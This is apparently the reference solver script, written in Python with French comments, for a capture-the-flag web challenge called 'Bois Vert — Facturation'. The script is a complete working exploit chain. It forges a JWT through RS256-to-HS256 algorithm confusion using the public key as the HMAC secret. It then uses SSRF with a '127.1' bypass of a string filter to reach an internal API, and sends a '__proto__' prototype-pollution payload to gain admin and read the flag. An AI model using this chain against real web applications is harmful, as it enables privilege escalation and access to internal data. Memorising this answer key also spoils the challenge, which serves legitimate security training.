#!/usr/bin/env python3
"""
solve.py — solveur de reference pour « Bois Vert — Facturation ».

Chaine : confusion d'algorithme RS256 -> HS256 (la cle publique sert de secret
HMAC) -> role compta -> SSRF vers l'API interne 127.0.0.1:9100 (filtre par
comparaison de chaine) -> pollution de prototype -> lecture du document interne.

Usage :
    python3 solve.py http://127.0.0.1:3000
Dependance :
    pip install requests
"""

import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.parse

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000").rstrip("/")
IDENT, MDP = "client", "Ch3ne33cm!"

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
s = requests.Session()

# ------------------------------------------------------- 1. Session cliente
s.post(f"{BASE}/login", data={"identifiant": IDENT, "motdepasse": MDP})
if "client" not in s.get(f"{BASE}/espace").text:
    sys.exit("[-] connexion refusee")
print("[+] connecte en tant que client")

# ------------------------------------- 2. Cle de signature active via JWKS
jwks = s.get(f"{BASE}/.well-known/jwks.json").json()["keys"]
actif = next(k for k in jwks if k.get("statut") == "actif")
print(f"[+] cle active : {actif['kid']} (l'autre est retiree du service)")

pem = s.get(f"{BASE}{actif['pem']}").content        # octets exacts du fichier
print(f"[+] cle publique recuperee ({len(pem)} octets)")

# --------------- 3. Confusion d'algorithme : HS256 avec la cle publique
entete = {"alg": "HS256", "typ": "JWT", "kid": actif["kid"]}
charge = {"sub": IDENT, "role": "compta", "iat": int(time.time())}
corps = f"{b64(json.dumps(entete, separators=(',', ':')).encode())}." \
        f"{b64(json.dumps(charge, separators=(',', ':')).encode())}"
sig = hmac.new(pem, corps.encode(), hashlib.sha256).digest()
jeton = f"{corps}.{b64(sig)}"

s.cookies.set("bv.jwt", jeton)
if "compta" not in s.get(f"{BASE}/espace").text:
    sys.exit("[-] le jeton forge n'est pas accepte")
print("[+] role compta obtenu")


def ssrf(url):
    r = s.get(f"{BASE}/compta/facture", params={"logo": url})
    try:
        return r.json().get("apercu", r.text)
    except ValueError:
        return r.text


# ------------------------- 4. SSRF : le filtre ne connait que deux chaines
interne = "http://127.1:9100"
print("[+] API interne :", ssrf(f"{interne}/internal/profil")[:120])

# ---------------------------------------------- 5. Pollution de prototype
charge_utile = urllib.parse.quote(json.dumps({"__proto__": {"isAdmin": True}}))
print("[+] pollution :", ssrf(f"{interne}/internal/preferences?data={charge_utile}")[:120])

# ------------------------------------------------------------------ 6. Flag
sortie = ssrf(f"{interne}/internal/documents/preuve").strip()
if "{" in sortie:
    print("[+] FLAG :", sortie)
else:
    sys.exit(f"[-] echec : {sortie}")
